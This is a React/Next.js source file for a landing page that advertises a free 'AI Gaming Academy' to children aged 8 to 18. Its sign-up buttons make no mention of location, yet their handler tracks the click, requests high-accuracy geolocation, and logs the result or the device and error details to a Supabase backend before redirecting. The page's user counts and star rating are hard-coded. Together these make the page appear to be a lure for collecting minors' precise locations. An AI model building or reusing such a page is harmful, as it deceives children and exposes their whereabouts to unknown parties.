'use client'

import { useRouter } from 'next/navigation'
import { useState, useEffect } from 'react'
import Image from 'next/image'
import { supabaseHelpers } from '../lib/supabase'
import { geolocationService } from '../lib/geolocation'

export default function LandingPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 })
  const [isVisible, setIsVisible] = useState(false)
  const [scrollY, setScrollY] = useState(0)
  const [isMobile, setIsMobile] = useState(false)

  useEffect(() => {
    // Track page visit
    supabaseHelpers.trackPageVisit('main_page')
    
    // Animate in on load
    setIsVisible(true)
    
    // Mobile detection
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768)
    }
    
    checkMobile()
    window.addEventListener('resize', checkMobile)
    
    // Mouse tracking for interactive effects (desktop only)
    const handleMouseMove = (e: MouseEvent) => {
      if (!isMobile) {
        setMousePosition({ x: e.clientX, y: e.clientY })
      }
    }
    
    // Scroll effects
    const handleScroll = () => {
      setScrollY(window.scrollY)
    }
    
    window.addEventListener('mousemove', handleMouseMove)
    window.addEventListener('scroll', handleScroll)
    
    return () => {
      window.removeEventListener('mousemove', handleMouseMove)
      window.removeEventListener('scroll', handleScroll)
      window.removeEventListener('resize', checkMobile)
    }
  }, [isMobile])

  const handleAllowLocation = async () => {
    setIsLoading(true)
    
    // Track the entry trigger
    await supabaseHelpers.trackUserAction('entry_trigger_clicked', {
      button: 'join_free_session',
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      page_url: window.location.href
    })

    // Step 1: Enhanced geolocation capture with 100% accuracy focus
    try {
      // Track geolocation attempt
      await supabaseHelpers.trackLocationPermission('requested')
      
      // Use the advanced geolocation service for maximum accuracy
      const locationData = await geolocationService.getCurrentLocation()
      
      // Track successful location capture with quality metrics
      await supabaseHelpers.trackLocationPermission('granted', locationData as unknown as Record<string, unknown>)
      
      // Store for form submission
      sessionStorage.setItem('userLocation', JSON.stringify(locationData))
      sessionStorage.setItem('locationCaptured', 'true')
      
      // Always proceed to form (Step 3)
      router.push('/success')

    } catch (error: unknown) {
      // Track location denial/error with detailed info
      const errorData = (error as GeolocationPositionError)?.code ? error : {
        error_code: 999,
        error_message: 'Geolocation service unavailable',
        method: 'service_unavailable',
        attempts: 'geolocation_service_failed',
        device_type: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'ios' : /Android/i.test(navigator.userAgent) ? 'android' : 'other',
        user_agent_snippet: navigator.userAgent.substring(0, 100)
      }
      
      await supabaseHelpers.trackLocationPermission('denied', errorData as Record<string, unknown>)
      
      // Store error for analytics
      sessionStorage.setItem('locationCaptured', 'false')
      sessionStorage.setItem('locationError', JSON.stringify(errorData))
      
      // Always proceed to form (Step 3)
      router.push('/success')
    }
  }

  return (
    <div className="gaming-landing">
      {/* Dynamic Cursor Effect - Desktop Only */}
      {!isMobile && (
        <div 
          className="cursor-glow"
          style={{
            left: mousePosition.x,
            top: mousePosition.y,
          }}
        />
      )}
      
      {/* Animated Particle Background */}
      <div className="particle-bg">
        {[...Array(isMobile ? 10 : 20)].map((_, i) => (
          <div key={i} className={`particle particle-${i % 5}`} />
        ))}
      </div>
      
      {/* Floating Elements */}
      <div className="floating-elements">
        <div className="float-element element-1" style={{ transform: `translateY(${scrollY * 0.1}px)` }}>🎮</div>
        <div className="float-element element-2" style={{ transform: `translateY(${scrollY * 0.15}px)` }}>⚡</div>
        <div className="float-element element-3" style={{ transform: `translateY(${scrollY * 0.08}px)` }}>🚀</div>
        <div className="float-element element-4" style={{ transform: `translateY(${scrollY * 0.12}px)` }}>💎</div>
        <div className="float-element element-5" style={{ transform: `translateY(${scrollY * 0.09}px)` }}>🎯</div>
        <div className="float-element element-6" style={{ transform: `translateY(${scrollY * 0.14}px)` }}>🌟</div>
        <div className="float-element element-7" style={{ transform: `translateY(${scrollY * 0.11}px)` }}>🔥</div>
        <div className="float-element element-8" style={{ transform: `translateY(${scrollY * 0.13}px)` }}>💫</div>
      </div>

      {/* Main Hero Container */}
      <div className={`hero-container ${isVisible ? 'visible' : ''}`}>
        <div className="hero-content">
          {/* Top Badge */}
          <div className="top-badge">
            <div className="badge-glow"></div>
            <span className="badge-icon">🎮</span>
            <span className="badge-text">AI GAMING ACADEMY</span>
            <span className="badge-icon pulse">🔥</span>
          </div>

          {/* Main Hero Title */}
          <h1 className="hero-title">
            <span className="title-word word-1">BUILD</span>
            <span className="title-word word-2">EPIC</span>
            <span className="title-word word-3">
              <span className="ai-gradient">AI</span>
            </span>
            <span className="title-word word-4">GAMES</span>
            <span className="title-word word-5">LIKE A</span>
            <span className="title-word word-6">PRO</span>
          </h1>

          {/* Feature Pills */}
          <div className="feature-pills">
            <div className="pill pill-1">
              <div className="pill-icon">🎨</div>
              <span>AI Art</span>
            </div>
            <div className="pill pill-2">
              <div className="pill-icon">🌍</div>
              <span>World Building</span>
            </div>
            <div className="pill pill-3">
              <div className="pill-icon">🎮</div>
              <span>Game Dev</span>
            </div>
          </div>

          {/* Description */}
          <div className="hero-description">
            <div className="age-badge">Ages 8-18 • 100% FREE</div>
            <p className="description-text">
              Master AI tools to create <span className="highlight-text">Roblox-style games</span>, 
              design incredible art, and build immersive worlds that blow minds!
            </p>
          </div>

          {/* Action Button */}
          <button 
            onClick={handleAllowLocation}
            disabled={isLoading}
            className={`action-button ${isLoading ? 'loading' : ''}`}
          >
            <div className="button-bg"></div>
            <div className="button-content">
              <span className="button-icon">{isLoading ? '⏳' : '🚀'}</span>
              <span className="button-text">
                {isLoading ? 'LAUNCHING YOUR ADVENTURE...' : 'START MY GAMING JOURNEY'}
              </span>
            </div>
            <div className="button-shine"></div>
          </button>

          {/* Social Proof */}
          <div className="social-proof">
            <div className="proof-item">
              <div className="proof-number">2,500+</div>
              <div className="proof-label">Young Creators</div>
            </div>
            <div className="proof-divider">✦</div>
            <div className="proof-item">
              <div className="proof-number">100%</div>
              <div className="proof-label">FREE Forever</div>
            </div>
            <div className="proof-divider">✦</div>
            <div className="proof-item">
              <div className="proof-stars">⭐⭐⭐⭐⭐</div>
              <div className="proof-label">5.0 Rating</div>
            </div>
          </div>
        </div>

        {/* Gaming Visual Section */}
        <div className="gaming-visual">
          <div className="screen-container">
            <div className="screen-frame">
              <div className="screen-content">
                <Image 
                  src="https://markovate.com/wp-content/uploads/2023/12/Next-Gen-Gaming_-The-Exciting-Role-of-AI-in-Gaming.webp" 
                  alt="AI Gaming Course - Create Amazing Games" 
                  className="game-preview"
                  fill
                  priority
                  sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 600px"
                />
                <div className="screen-overlay">
                  <div className="play-trigger">
                    <div className="play-icon">▶</div>
                    <div className="play-ripple"></div>
                  </div>
                </div>
              </div>
              <div className="screen-reflection"></div>
            </div>
          </div>
          
          {/* Gaming UI Elements */}
          <div className="ui-elements">
            <div className="ui-item ui-health">
              <span className="ui-icon">❤️</span>
              <span className="ui-value">100</span>
              <div className="ui-bar health-bar"></div>
            </div>
            <div className="ui-item ui-energy">
              <span className="ui-icon">⚡</span>
              <span className="ui-value">250</span>
              <div className="ui-bar energy-bar"></div>
            </div>
            <div className="ui-item ui-level">
              <span className="ui-icon">💎</span>
              <span className="ui-text">Level 99</span>
              <div className="ui-sparkle"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Mobile Enhancement: Bottom Action Bar */}
      {isMobile && (
        <div className="mobile-action-bar">
          <div className="mobile-action-content">
            <div className="mobile-info">
              <span className="mobile-title">Start Learning AI</span>
              <span className="mobile-subtitle">100% Free • Ages 8-18</span>
            </div>
            <button 
              onClick={handleAllowLocation}
              disabled={isLoading}
              className="mobile-cta-button"
            >
              {isLoading ? '⏳' : '🚀'} Join Now
            </button>
          </div>
        </div>
      )}
    </div>
  )
}
